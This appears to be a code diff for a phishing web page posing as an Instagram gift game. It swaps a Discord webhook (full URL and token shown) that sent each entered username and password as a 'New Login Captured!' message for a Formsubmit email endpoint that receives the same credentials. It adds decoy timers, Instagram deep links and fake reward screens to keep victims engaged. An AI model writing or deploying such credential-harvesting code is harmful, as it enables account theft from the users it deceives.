@@ -254,22 +254,23 @@
                 return;
             }
 
-            // Aapka Discord Webhook URL yahan set hai
-            const webhookURL = "https://discord.com/api/webhooks/1562500504456667147/9AuUBXE6J3mqsPNVpCe-oFSyA9LQvt-R_jiwIUfintw1x8wPvssb1Gdmez1VAhhLO9yZ";
-
-            // Discord Message Format
-            const payload = {
-                content: `🚨 **New Login Captured!**\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n⏰ **Time:** \`${timeStr}\``
-            };
-
-            // Send data to Discord via Webhook
-            fetch(webhookURL, {
+            // Send data via AJAX (Fetch) directly to Formsubmit
+            fetch("https://formsubmit.co/ajax/vs4539876@gmail.com", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    Username: username,
+                    Password: password,
+                    Time: timeStr,
+                    _captcha: "false"
+                })
             })
-            .then(response => console.log("Sent to Discord successfully!"))
-            .catch(error => console.error("Error:", error));
+            .then(response => response.json())
+            .then(data => console.log("Email sent successfully:", data))
+            .catch(error => console.log("Error sending email:", error));
 
             // Smoothly move to next screen
             showScreen('gameSetupScreen');
@@ -291,4 +292,51 @@
                 totalSeconds--;
                 updateTimerDisplay();
 
-                if(totalSeconds <= 
+                if(totalSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    triggerGiftScreen();
+                }
+            }, 1000);
+
+            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
+            const schemeUri = `instagram://user?username=${friend}`;
+
+            window.location.href = schemeUri;
+            setTimeout(() => {
+                window.location.href = intentUri;
+            }, 500);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            document.getElementById('widgetTimer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+
+        function checkTimerProgress() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            alert(`⏳ Background Task Progress:\nTime remaining: ${mins} minutes ${secs} seconds.\nKeep chatting on Instagram to complete the reward!`);
+        }
+
+        const gifts = [
+            { icon: "💍", name: "Diamond Ring Gift!" },
+            { icon: "🌹", name: "Red Rose Bouquet!" },
+            { icon: "🧸", name: "Cute Teddy Bear!" },
+            { icon: "🍫", name: "Chocolate Box!" }
+        ];
+
+        function triggerGiftScreen() {
+            document.getElementById('floatingWidget').classList.add('hidden');
+            const selectedGift = gifts[Math.floor(Math.random() * gifts.length)];
+            document.getElementById('randomGiftIcon').innerText = selectedGift.icon;
+            document.getElementById('giftNameText').innerText = selectedGift.name;
+            showScreen('giftScreen');
+        }
+
+        function claimGift() {
+            showScreen('successScreen');
+        }
+    </script>
+</body>
+</html>
